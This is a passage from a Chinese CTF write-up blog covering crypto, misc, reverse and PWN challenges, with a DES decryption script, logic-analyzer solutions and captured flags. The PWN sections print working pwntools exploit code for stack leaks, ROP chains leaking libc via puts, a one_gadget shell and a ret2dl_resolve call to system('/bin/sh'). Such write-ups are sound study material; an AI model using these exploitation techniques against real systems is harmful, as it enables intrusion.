44, 12, 52, 20, 60, 28,</span><br><span class="line">    35, 3, 43, 11, 51, 19, 59, 27,</span><br><span class="line">    34, 2, 42, 10, 50, 18, 58, 26,</span><br><span class="line">    33, 1, 41, 9, 49, 17, 57, 25]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#将列表分成大小为n的子列表</span><br><span class="line">def split(s, n):</span><br><span class="line">    return [s[k:k+n] for k in range(0, len(s), n)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#对明文进行initial transposition</span><br><span class="line">def  initial_transposition(plain):</span><br><span class="line">    plain_it=[plain[IT[i]-1] for i in range(64)]</span><br><span class="line">    return plain_it</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#E盒置换</span><br><span class="line">def get_across_ebox(plain_it_r):</span><br><span class="line">    plain_ebox=[plain_it_r[EBox[i]-1] for i in range(48)]</span><br><span class="line">    return plain_ebox</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#将十进制转换位4位的二进制字符串</span><br><span class="line">def dec_to_4bin(dec):</span><br><span class="line">    res=bin(dec).replace(&apos;0b&apos;,&apos;&apos;)</span><br><span class="line">    fix=(4-len(res))*&apos;0&apos;</span><br><span class="line">    return fix+res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#二进制转str</span><br><span class="line">def bit_to_str(array): </span><br><span class="line">    res = &apos;&apos;.join([chr(int(j,2)) for j in [&apos;&apos;.join([str(i) for i in bytes]) for bytes in  split(array,8)]])   </span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#S盒置换</span><br><span class="line">def get_across_sbox(plain_ebox):</span><br><span class="line">    plain_sbox=[]</span><br><span class="line">    for i in range(8):</span><br><span class="line">        subplain=plain_ebox[i*6:i*6+6]</span><br><span class="line">        row=int(str(subplain[0])+str(subplain[-1]),2)</span><br><span class="line">        col=int(str(subplain[1])+str(subplain[2])+str(subplain[3])+str(subplain[4]),2)</span><br><span class="line">        plain=SBox[i][row][col]</span><br><span class="line">        plain_sbox.append(dec_to_4bin(plain))</span><br><span class="line">    return [int(x) for x in &apos;&apos;.join(plain_sbox)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#P盒置换</span><br><span class="line">def get_across_pbox(plain_sbox):</span><br><span class="line">    plain_pbox=[plain_sbox[PBox[i]-1] for i in range(32)]</span><br><span class="line">    return plain_pbox</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#final transposition</span><br><span class="line">def final_transposition(plain):</span><br><span class="line">    crypto=[plain[FT[i]-1] for i in range(64)]</span><br><span class="line">    return crypto</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#异或</span><br><span class="line">def xor(m,n):</span><br><span class="line">    return [a^b for a,b in zip(m,n)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#str转二进制</span><br><span class="line">def str_to_bit(text):</span><br><span class="line">    array = list()</span><br><span class="line">    for char in text:</span><br><span class="line">        binval = char_to_bin(char, 8)</span><br><span class="line">        array.extend([int(i) for i in list(binval)]) </span><br><span class="line">    return array</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#字符转二进制</span><br><span class="line">def char_to_bin(val, bitsize): </span><br><span class="line">    bin_val = bin(val)[2:] if isinstance(val, int) else bin(ord(val))[2:]</span><br><span class="line">    if len(bin_val) &gt; bitsize:</span><br><span class="line">        print (&quot;error&quot;)</span><br><span class="line">    while (len(bin_val)-bitsize):</span><br><span class="line">        bin_val = &quot;0&quot;+bin_val #padding 0位</span><br><span class="line">    return bin_val</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    for n in range(15): #猜测n</span><br><span class="line">        part_encode = &apos;92d915250119e12b&apos;.decode(&apos;hex&apos;)</span><br><span class="line">        keymap = &apos;e0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84&apos;.decode(&apos;hex&apos;)</span><br><span class="line">        subkey = []</span><br><span class="line">        for i in range(16):</span><br><span class="line">            sub = keymap[6*i: 6+6*i]</span><br><span class="line">            subkey.append(str_to_bit(sub))  #得到子密钥</span><br><span class="line">        crypto=str_to_bit(part_encode)</span><br><span class="line">        l, r = split(crypto, 32) </span><br><span class="line">        r, l = split(crypto, 32) </span><br><span class="line">        result = []</span><br><span class="line">        #开始解密</span><br><span class="line">        for i in range(16): </span><br><span class="line">            if i &lt; n: #不使用前n轮的子密钥解密</span><br><span class="line">                continue</span><br><span class="line">            r_ebox = get_across_ebox(r) </span><br><span class="line">            r_xor = xor(subkey[15-i], r_ebox)</span><br><span class="line">            r_sbox = get_across_sbox(r_xor) </span><br><span class="line">            r_pbox = get_across_pbox(r_sbox)</span><br><span class="line">            r_xor1 = xor(l, r_pbox)</span><br><span class="line">            l = r</span><br><span class="line">            r = r_xor1</span><br><span class="line">        result = result+ final_transposition(r+l)</span><br><span class="line">        final = bit_to_str(result)  </span><br><span class="line">        print (&quot;flag&#123;%s&#125;&quot;%final)#输出结果</span><br></pre></td></tr></table></figure></p>
<p>运行结果为：<br><img src="https://upload-images.jianshu.io/upload_images/11234137-3068da5a25b4f5cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p><strong>FLAG**</strong>值：**<br>flag{y0ur9Ood}</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="0x08-saleae"><a href="#0x08-saleae" class="headerlink" title="0x08 saleae"></a>0x08 saleae</h2><p><strong>操作内容：</strong><br>用Saleae Logic打开，设置一下<br><img src="https://upload-images.jianshu.io/upload_images/11234137-50a0b6dea2a34947.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p><strong>FLAG值：</strong><br>flag{12071397-19d1-48e6-be8c-784b89a95e07}</p>
<h2 id="0x09-24c"><a href="#0x09-24c" class="headerlink" title="0x09 24c"></a>0x09 24c</h2><p><strong>操作内容：</strong><br> 用Saleae Logic打开之后，设置I2C协议。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-1ced7796ce4d969f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p> 发现三段flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-a27bb89fdf698416.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p> 先还原flag，然后提交了多次，发现错误。然后发现有一个0x09的地方，意思是先将原来的flag排出来，然后在第9个字符的位置，用ac替换9e，最终得到flag</p>
<p><img src="https://upload-images.jianshu.io/upload_images/11234137-4c5f4e059f70998a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p><strong>FLAG值：</strong><br>flag{c46d9e10-e9b5-4d90-a883-41cf163bdf4e}</p>
<h2 id="0x0a-usbasp"><a href="#0x0a-usbasp" class="headerlink" title="0x0a usbasp"></a>0x0a usbasp</h2><p><strong>操作内容：</strong><br>同样用工具打开，放大查看，确定每个channel对应的信息，设置一下，得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-82f959c14f88ac75.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p><strong>FLAG值：</strong><br>flag{85b084c6-42e6-495c-87b4-46dfb1df58a0}</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="0x0b-easyGO"><a href="#0x0b-easyGO" class="headerlink" title="0x0b easyGO"></a>0x0b easyGO</h2><p><strong>操作内容：</strong><br> 用IDAGolangHelper恢复函数表<br><img src="https://upload-images.jianshu.io/upload_images/11234137-c65b8294bc99ec4a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p> 索引printrln 找到输出<br><img src="https://uploader.shimo.im/f/HiUYdgGadVE0hblM.png!thumbnail" alt="图片"><br> 交叉索引找到main，将字符串经过stringtoslicebyte、slicebytetostring、base64后与输入验证<br><img src="https://uploader.shimo.im/f/Z7MYGePX9qUilIM0.png!thumbnail" alt="图片"><br> 直接在内存中找到运算后的字符就是flag<br><img src="https://uploader.shimo.im/f/kQj4xxVqndQyQR4M.png!thumbnail" alt="图片"><br><strong>FLAG内容：</strong><br>flag{92094daf-33c9-431e-a85a-8bfbd5df98ad}</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="0x0c-your-pwn"><a href="#0x0c-your-pwn" class="headerlink" title="0x0c your_pwn"></a>0x0c your_pwn</h2><p><strong>操作内容：</strong><br>扔IDA里，main函数里边没问题，但是调用的函数里V1大小没限制的漏洞可以利用。<br><img src="https://uploader.shimo.im/f/HTKux8AL4e8qyuBT.png!thumbnail" alt="图片"></p>
<p>通过这个漏洞可以泄露 + 更改栈<br>开始写exp<br>因为开了canary，所以可以先把返回地址（rbp + 8）找到<br><img src="https://uploader.shimo.im/f/h5lIWK3qBZEOF8bo.png!thumbnail" alt="图片"><img src="https://uploader.shimo.im/f/oWJ7h8ep3a0e8GXK.png!thumbnail" alt="图片"><br>所以可以在程序中泄露出main+AC的地址，也就有程序基地址了。</p>
<p>dedef hack(index, value):<br>    if(value == 0):<br>        p.recvuntil(‘input index\n’)<br>        p.sendline(str(index))<br>        p.recvuntil(‘now value(hex) ‘)<br>        result = p.recvline()[:-1]<br>        p.sendlineafter(‘input new value\n’, str(int(result, 16)))<br>        return result[-2:]<br>    else:<br>        p.recvuntil(‘input index\n’)<br>        p.sendline(str(index))<br>        p.recvuntil(‘now value(hex) ‘)<br>        result = int(p.recvline()[:-1], 16)<br>        p.sendlineafter(‘input new value\n’, str(value))<br>        return result                                         #这个return其实没用到，但是这么写好看啊(<em>O_O</em>)</p>
<p>ret_addr = int(hack(0x15f, 0)+hack(0x15e, 0)+hack(0x15d, 0)+hack(0x15c, 0)+hack(0x15b, 0)+hack(0x15a, 0)+hack(0x159, 0)+hack(0x158, 0), 16)<br>elf.address = ret_addr - 0xb11</p>
<p>得到基地址就可以构建rop链了。<br><img src="https://uploader.shimo.im/f/2gXkgFEkLxQ0qlFf.png!thumbnail" alt="图片"><br>rop链里边的pop|ret要选牵涉寄存器最少、不能动rbp的pop，所以选择了在正中间的0d03。通过ropgadget找到pop_ret的地址就有函数的返回地址了，再构造一个puts（puts）用puts函数打出puts的真实地址，就能获得libc基址。（这里的libc版本是试了2.27之后盲猜的2.23版本）<br>（过程中要注意次数，过了0x28次就要输入’yes’使程序继续进行）</p>
<p>def hack_addr(index, addr):<br>    base = 0x158 + index * 8<br>    hack(base, addr &amp; 0xff)<br>    hack(base + 1, (addr &gt;&gt; 0x8) &amp; 0xff)                          # (这里调用的hack函数在上边，为了更<br>    hack(base + 2, (addr &gt;&gt; 0x10) &amp; 0xff)                        #  好说明思路把它拆开了。)<br>    hack(base + 3, (addr &gt;&gt; 0x18) &amp; 0xff)<br>    hack(base + 4, (addr &gt;&gt; 0x20) &amp; 0xff)<br>    hack(base + 5, (addr &gt;&gt; 0x28) &amp; 0xff)<br>    hack(base + 6, (addr &gt;&gt; 0x30) &amp; 0xff)<br>    hack(base + 7, (addr &gt;&gt; 0x38) &amp; 0xff)<br>    return index + 1</p>
<p>pop_ret = elf.address + 0xd03<br>puts_addr = elf.symbols[‘puts’]<br>puts_got = elf.got[‘puts’]<br>hack_addr(hack_addr(hack_addr(hack_addr(0, pop_ret), puts_got), puts_addr), ret_addr)<br>hack(0, 0)<br>p.sendafter(‘do you want continue(yes/no)? \n’, ‘yes’)<br>libc.address = u64(p.recvline()[:-1].ljust(8, ‘\x00’)) - puts_addr</p>
<p>最后只要空跑33遍，再把返回地址改成libc里面的one_gadget的地址加上libc基址就能成功getshell。（空跑33遍为了凑足0x28遍好结束）</p>
<p>hack_addr(0, libc.address + 0xf1147)<br>for i in range(33):<br>    hack(0, 0)<br>p.interactive()</p>
<p>最终exp截图：</p>
<p><img src="https://uploader.shimo.im/f/7VNlb6ORa3sfJ0Ft.png!thumbnail" alt="图片"><img src="https://uploader.shimo.im/f/xJCYOdYtM0UWdSxd.png!thumbnail" alt="图片"></p>
<h2 id="0x0d-baby-pwn"><a href="#0x0d-baby-pwn" class="headerlink" title="0x0d baby_pwn"></a>0x0d baby_pwn</h2><p><strong>操作内容：</strong><br>扔IDA打开<br><img src="https://uploader.shimo.im/f/jyWQnCsjkj0jToRh.png!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/3jI4Fl5d8jQFpDjE.png!thumbnail" alt="图片"><br><img src="https://uploader.shimo.im/f/Y8VdDAnAEycDje8A.png!thumbnail" alt="图片"><br>源程序贼简单栈溢出很清楚，但没输出。<br><img src="https://uploader.shimo.im/f/CphnP2byuCQYMYu4.png!thumbnail" alt="图片"><br>Checksec之后发现只有NX，基本可以断定是return to dl_resolve</p>
<p>开始写exp<br>把栈迁移到bss段再返回vuln函数</p>
<p>buf1 = ‘A’ * offset</p>
<p>buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)</p>
<p>p.send(buf1)</p>
<p>之后calldl_Resolve()并且填充假数据</p>
<p>buf2 =  rop.string(‘/bin/sh’)</p>
<p>buf2 += rop.fill(20, buf2)</p>
<p>buf2 += rop.dl_resolve_data(addr_bss+20, ‘system’)</p>
<p>buf2 += rop.fill(100, buf2)</p>
<p>p.send(buf2)</p>
<p>使用dl_resolve_call 调用system（“/bin/sh”），成功getshell</p>
<p>buf3 = ‘A’*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)</p>
<p>p.send(buf3)</p>
<p>最终exp截图<br><img src="https://uploader.shimo.im/f/zhm1uhtO7d4oyNGp.png!thumbnail" alt="图片"><br><strong>FLAG值： </strong><br>flag{b8313ecb06a0fd2742315678634161b5}</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/CTF/" rel="tag"># CTF</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/04/18/2019DDctfWP/" rel="next" title="2019DDctfWP">
                <i class="fa fa-chevron-left"></i> 2019DDctfWP
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/05/17/DataConDns1/" rel="prev" title="360Datacon大数据安全比赛DNS方向一WP">
                360Datacon大数据安全比赛DNS方向一WP <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Bling_Dog">
            
              <p class="site-author-name" itemprop="name">Bling_Dog</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">22</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/PiPiChenA" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="563667866@qq.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-globe"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-签到题"><span class="nav-number">1.</span> <span class="nav-text">0x00 签到题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-JustSoso"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 JustSoso</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-最简单的sql注入"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 最简单的sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Love-math"><span class="nav-number">2.3.</span> <span class="nav-text">0x03 Love math</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">3.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-puzzles"><span class="nav-number">3.1.</span> <span class="nav-text">0x04 puzzles</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-warmup"><span class="nav-number">3.2.</span> <span class="nav-text">0x05 warmup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Asymmetric"><span class="nav-number">3.3.</span> <span class="nav-text">0x06 Asymmetric</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-Simple"><span class="nav-number">3.4.</span> <span class="nav-text">0x07 Simple</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">4.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-saleae"><span class="nav-number">4.1.</span> <span class="nav-text">0x08 saleae</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-24c"><span class="nav-number">4.2.</span> <span class="nav-text">0x09 24c</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0a-usbasp"><span class="nav-number">4.3.</span> <span class="nav-text">0x0a usbasp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-number">5.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0b-easyGO"><span class="nav-number">5.1.</span> <span class="nav-text">0x0b easyGO</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">6.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0c-your-pwn"><span class="nav-number">6.1.</span> <span class="nav-text">0x0c your_pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0d-baby-pwn"><span class="nav-number">6.2.</span> <span class="nav-text">0x0d baby_pwn</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Bling_Dog</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>
  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/click.js"></script>

